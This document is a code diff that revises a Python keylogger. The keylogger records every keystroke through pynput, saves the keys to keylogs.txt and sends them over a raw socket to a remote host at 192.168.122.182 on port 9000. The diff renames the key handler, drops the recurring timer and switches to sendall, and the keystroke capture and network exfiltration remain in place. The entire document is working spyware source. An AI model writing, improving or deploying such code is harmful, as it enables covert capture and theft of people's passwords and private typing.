@@ -1,16 +1,12 @@
 import pynput.keyboard
 import socket
-import os
 import threading
 
 class Keylogger:
     def __init__(self):
         self.log = ""
 
-    def append_to_log(self, string):
-        self.log += string
-
-    def process_key_press(self, key):
+    def on_press(self, key):
         try:
             current_key = str(key.char)
         except AttributeError:
@@ -18,33 +14,29 @@ class Keylogger:
                 current_key = " "
             else:
                 current_key = " " + str(key) + " "
+        self.log += current_key
         print(f"Key pressed: {current_key}")
-        self.append_to_log(current_key)
 
     def report(self):
-        with open("keylogs.txt", "w") as f:
-            f.write(self.log)
-        print("Log file updated")
+        with open("keylogs.txt", "w") as file:
+            file.write(self.log)
         self.send_data()
         self.log = ""
-        timer = threading.Timer(10, self.report)
-        timer.start()
 
     def send_data(self):
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("192.168.122.182", 9000))
-            s.send(self.log.encode())
-            print("Data sent to server")
-            s.close()
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect(("192.168.122.182", 9000))
+            sock.sendall(self.log.encode())
+            sock.close()
+            print("Data sent successfully")
         except Exception as e:
             print(f"Failed to send data: {e}")
 
     def start(self):
-        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
         with keyboard_listener:
             self.report()
-            keyboard_listener.join()
 
 if __name__ == "__main__":
     keylogger = Keylogger()
